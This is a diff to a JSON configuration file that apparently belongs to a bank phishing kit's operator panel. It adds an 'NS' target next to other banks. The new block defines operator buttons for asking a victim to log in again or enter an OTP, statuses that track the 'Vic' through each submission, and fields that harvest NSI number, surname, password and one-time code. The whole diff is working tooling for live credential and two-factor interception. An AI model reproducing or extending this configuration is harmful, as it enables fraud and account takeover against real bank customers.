@@ -97,6 +97,10 @@
       "id": "nab"
     },
     {
+      "name": "NS",
+      "id": "nsi"
+    },
+    {
       "name": "Ober",
       "id": "oberbank"
     },
@@ -311,6 +315,71 @@
     "mainInfo": [
       {
         "usernameHeading": "regnumber"
+      }
+    ]
+  },
+  "nsi": {
+    "buttons": [
+      {
+        "name": "ASK LOGIN AGAIN",
+        "status": "0"
+      },
+      {
+        "name": "ASK OTP",
+        "status": "2"
+      },
+      {
+        "name": "FINISH",
+        "status": "4"
+      }
+    ],
+    "status": [
+      {
+        "status": 0,
+        "meaning": "Vic Resubmitting Login"
+      },
+      {
+        "status": 1,
+        "meaning": "Vic Waiting... Submitted Login"
+      },
+      {
+        "status": 2,
+        "meaning": "Vic Submitting OTP"
+      },
+      {
+        "status": 3,
+        "meaning": "Vic Waiting... Submitted OTP"
+      },
+      {
+        "status": 4,
+        "meaning": "Finished"
+      },
+      {
+        "status": 5,
+        "meaning": "Vic Waiting... Resubmitted Login"
+      }
+    ],
+    "information": [
+      {
+        "heading": "NSI Number",
+        "key": "nsiNumber"
+      },
+      {
+        "heading": "Surname",
+        "key": "surname"
+      },
+      {
+        "heading": "Password",
+        "key": "password"
+      },
+      {
+        "heading": "OTP",
+        "key": "otp"
+      }
+    ],
+    "mainInfo": [
+      {
+        "usernameHeading": "nsiNumber"
       }
     ]
   },
